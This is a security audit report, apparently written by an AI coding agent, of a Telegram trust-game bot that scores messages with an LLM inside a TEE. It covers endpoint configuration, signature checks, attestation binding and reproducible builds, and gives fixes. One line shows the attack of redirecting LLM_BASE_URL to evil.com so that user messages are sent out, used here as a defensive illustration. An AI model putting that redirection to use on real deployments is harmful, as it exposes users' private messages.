# TEE-Totalled Vibe Audit

**Project**: https://github.com/sangaline/tee-totalled/
**Date**: 2026-02-05
**Auditor**: Claude Code

## Executive Summary

TEE-Totalled is a Telegram bot implementing a "trust game" where users submit offensive messages that get scored by an LLM running in a TEE. The premise is that willingness to share sensitive content indicates trust in TEE privacy guarantees.

| Component | Status | Notes |
|-----------|--------|-------|
| LLM Base URL | ⚠️ **CRITICAL** | Operator-configurable, enables token exfiltration |
| Signature Verification | ⚠️ **MEDIUM** | Hash mismatch accepted as "known issue" |
| TDX Quote Binding | ⚠️ **MEDIUM** | No cryptographic binding verified |
| Build Reproducibility | ❌ NOT REPRODUCIBLE | Missing timestamps, snapshot pins |
| Message Privacy | ✅ DESIGN OK | Memory-only storage, aggregate-only output |
| dstack Integration | ✅ OK | Standard SDK usage |

---

## Critical Issues

### 1. LLM_BASE_URL is Operator-Configurable (Token Exfiltration)

**Severity**: CRITICAL
**File**: `src/tee_totalled/config.py:28`

```python
llm_base_url: str = "https://api.redpill.ai/v1"
```

The LLM endpoint defaults to RedPill but is loaded via pydantic_settings, which reads from environment variables. In `docker-compose.yml`, this variable is NOT hardcoded:

```yaml
environment:
  - TELEGRAM_BOT_TOKEN=${TELEGRAM_BOT_TOKEN}
  - REDPILL_API_KEY=${REDPILL_API_KEY}
  - TEE_ENV=production
  # LLM_BASE_URL not set - falls back to default, but could be overridden!
```

**Attack Vector**: An operator deploying this bot can add `LLM_BASE_URL=https://evil.com` to intercept ALL user messages. The malicious endpoint receives:
- Full message text submitted for scoring
- The message is sent in the `user_prompt` field to `/v1/chat/completions`

**Impact**: Complete compromise of user privacy - all "offensive messages" exfiltrated to operator.

**This is the same pattern as XORDI-TOY-EXAMPLE** where `MOCK_API_URL` enabled token exfiltration.

**Fix**: Hardcode `LLM_BASE_URL` directly in `docker-compose.yml`:
```yaml
environment:
  - LLM_BASE_URL=https://api.redpill.ai/v1  # Hardcoded, not operator-configurable
```

---

### 2. Signature Hash Mismatch Accepted

**Severity**: MEDIUM
**File**: `src/tee_totalled/verification.py:248-254`

```python
if computed_text != expected_text:
    # Known issue: non-streaming responses may have modified hashes.
    # The signature is still valid, proving it came from the TEE.
    logger.debug(...)
```

The code explicitly accepts responses where `SHA256(request):SHA256(response)` doesn't match what was signed. This means:
- The signature proves *some* response was signed by the TEE key
- It does NOT prove *this specific response* was generated for *this specific request*

**Impact**: A malicious proxy could:
1. Intercept requests, forward to real RedPill API
2. Cache valid signature/response pairs
3. Replay old signatures with different scores

This is acknowledged as a "known API issue" but significantly weakens integrity guarantees.

---

### 3. No Cryptographic Binding Between TDX Quote and Signing Key

**Severity**: MEDIUM
**File**: `src/tee_totalled/verification.py:100-117`

The verification flow:
1. Fetch `/attestation/report` → gets `signing_address` + `intel_quote`
2. Submit `intel_quote` to Phala for TDX verification
3. Trust that `signing_address` is bound to the verified TEE

**Problem**: There's no verification that `signing_address` is derived from or embedded in the TDX quote's `report_data`. The RedPill API is trusted to return the correct association.

To properly verify:
- Extract `report_data` from the TDX quote
- Verify it contains a commitment to the `signing_address` (e.g., `hash(pubkey)`)
- Or verify the signing key is derived deterministically from TEE measurements

Currently, users must trust RedPill's API to return honest attestation bundles.

---

## Build Reproducibility Issues

### 4. Docker Image Not Reproducible

**Severity**: HIGH (for auditability)
**Files**: `Dockerfile`, `.github/workflows/docker.yml`

Issues preventing reproducible builds:

1. **No SOURCE_DATE_EPOCH**:
   ```dockerfile
   # Missing: ENV SOURCE_DATE_EPOCH=0
   ```

2. **No --rewrite-timestamp in buildx**:
   ```yaml
   - uses: docker/build-push-action@v6
     with:
       # Missing: build-args for reproducibility
   ```

3. **Unpinned base image**:
   ```dockerfile
   FROM python:3.12-slim AS base  # No @sha256:xxx
   ```

4. **apt-get update fetches latest**:
   ```dockerfile
   RUN apt-get update  # Non-deterministic
   ```

**Impact**: Cannot verify that a deployed image matches source code. Two builds from the same commit will produce different digests.

---

## Medium Issues

### 5. Development Fallbacks Exist in Production Code

**File**: `src/tee_totalled/attestation.py:84-101`

```python
def _dev_quote(self) -> dict[str, Any]:
    """Return mock quote data for development."""
    return {
        "status": "development_mode",
        ...
    }
```

While gated behind `DSTACK_SDK_AVAILABLE` checks, these code paths exist and could be triggered by:
- Import errors
- SDK initialization failures
- Network issues reaching dstack socket

In production, failures should be hard failures, not fallbacks.

### 6. REDPILL_API_KEY Operator-Provided

The API key is runtime-configurable. While signature verification binds responses to the TEE's signing key, an operator using their own RedPill key could:
- Use a different model than expected
- Have different rate limits or logging settings

This is likely intentional (operators need their own API keys), but users should understand the operator controls the API account.

### 7. Messages Stored in Memory Until Game Ends

**File**: `src/tee_totalled/game.py:26`

```python
@dataclass
class Submission:
    user_id: int
    message: str  # Full message stored here
    score: int
```

Messages persist in memory for up to 30 minutes (game duration). Risks:
- Core dumps could expose messages
- Memory forensics post-crash
- No scrubbing of message content from memory

For a privacy-focused app, consider:
- Only storing scores, not messages
- Zeroing message memory after scoring

---

## What's Done Well

### Mandatory Startup Attestation Gate
`__main__.py` requires successful TDX verification before the bot starts:
```python
if not await verify_redpill_attestation():
    sys.exit(1)
```

### Per-Response Signature Verification
Every LLM response must pass ECDSA signature verification:
```python
if not sig_result.valid:
    raise VerificationError(error_msg)
```

### User-Verifiable Nonces
Users can provide their own nonce for fresh attestation:
```
/verify my secret nonce
```

### Aggregate-Only Results
Individual messages never revealed - only histograms and statistics.

### Log Suppression in Production
Sensitive loggers suppressed in production mode:
```python
if settings.is_production:
    logging.getLogger("tee_totalled.llm").setLevel(logging.WARNING)
```

---

## Recommendations

### Immediate (Critical)

1. **Hardcode LLM_BASE_URL in docker-compose.yml**
   ```yaml
   - LLM_BASE_URL=https://api.redpill.ai/v1
   ```

### High Priority

2. **Add proper hash verification** or document the limitation clearly for users
3. **Pin base image by digest** in Dockerfile
4. **Add reproducibility flags** to CI build

### Medium Priority

5. **Remove development fallbacks** from production paths - fail hard instead
6. **Consider not storing message text** after scoring - only keep scores
7. **Add TDX report_data binding verification** or document the trust assumption

---

## Verification Checklist

| Check | Status |
|-------|--------|
| Source code public | ✅ GitHub |
| Docker image public | ✅ DockerHub |
| Reproducible build | ❌ Not reproducible |
| API endpoints hardcoded | ❌ LLM_BASE_URL configurable |
| Secrets in KMS | ⚠️ Phala Cloud secrets (assumed) |
| Smart contract verified | N/A (no on-chain component) |
| Independent attestation possible | ✅ /verify command with nonce |

---

## Data Flow Summary

```
User → Telegram → Bot (dstack TEE)
                    ↓
           LLM_BASE_URL ← ⚠️ OPERATOR-CONTROLLED
                    ↓
              RedPill API (TDX TEE)
                    ↓
              Score returned
                    ↓
           Signature verified
                    ↓
         Score stored (+ message in memory)
                    ↓
        Game ends → Aggregate stats only
```

The critical trust boundary is the `LLM_BASE_URL` - if an operator controls this, all privacy guarantees are void.
